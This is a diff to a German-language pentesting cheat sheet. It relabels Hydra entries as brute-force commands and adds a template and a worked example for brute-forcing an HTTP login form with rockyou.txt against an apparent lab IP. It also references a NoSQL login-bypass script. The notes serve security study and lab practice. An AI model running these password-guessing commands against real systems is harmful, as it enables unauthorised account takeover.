@@ -303,24 +303,34 @@ python3 nosql-login-bypass.py -t [POST-URL] -u customer0 -p compass
 - Nativ in Kali installiert
 
 ### Syntax
-- Scan mit bekanntem Benutzernamen
+- Bruteforce mit bekanntem Benutzernamen
 ```
 hydra -l [username] -P [passwordlist] [server] [protocol]
 ```
 
-- Scan mit Verbose Modus
+- Bruteforce mit Verbose Modus
 ```
 hydra -L [usernamelist] -P [passwordlist] [server] [protocol] -V
 ```
 
-- Scan auf spezfiischen Port
+- Bruteforce auf spezfischen Port
 ```
 hydra -s [port] -l [username] -P [passwordlist] [server] [protocol]
 ```
 
-- Scan mit mehreren Threads
+- Bruteforce mit mehreren Threads
 ```
 hydra -l [username] -P [passwordlist] [server] [protocol] -t [number of threads]
+```
+
+- Bruteforce HTTP-Forms
+```
+hydra -l [username] -P [passwordlist] [server] [method] "[redirectionurl]:[parameters]:[failmessage]"
+```
+
+- Beispiel für Bruteforce HTTP-Forms
+```
+hydra -l admin -P rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
 ```
 
 ## [fail2ban](https://webdock.io/en/docs/how-guides/security-guides/how-configure-fail2ban-common-services)
